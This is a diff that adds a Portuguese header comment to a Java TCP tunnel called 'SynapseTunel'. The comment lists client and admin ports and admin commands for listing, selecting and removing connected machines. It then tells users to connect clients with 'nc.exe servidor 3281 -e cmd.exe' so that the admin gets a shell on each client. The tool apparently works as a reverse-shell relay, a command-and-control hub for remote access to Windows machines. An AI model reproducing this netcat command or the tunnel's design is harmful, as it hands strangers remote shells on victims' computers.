@@ -1,5 +1,19 @@
 /*
  * SynapseTunel - Tunel TCP/IP em Java
+ * -----------------------------------
+ * Os clientes se conectam na porta 3281
+ * O administrador conecta na porta 3282
+ * Comandos do Administrador:
+ *    lsm         - lista as maquinas clientes conectadas
+ *    connect:1   - conecta na maquina de índice 1, por exemplo.
+ *    disconnect  - desconecta da maquina cliente
+ *    remove:1    - desconecta e remove maquina cliente
+ *    info        - retorna informacao da conexao atual
+ * Dica: 
+ * Conectar o cliente ao SynapseTunel da seguinte forma:
+ * > nc.exe servidor 3281 -e cmd.exe
+ * Assim o admin cai na shell ao conectar na maquina cliente :)
+ * ---
  * Ivan S. Vargas
  * contato@is5.com.br
  */
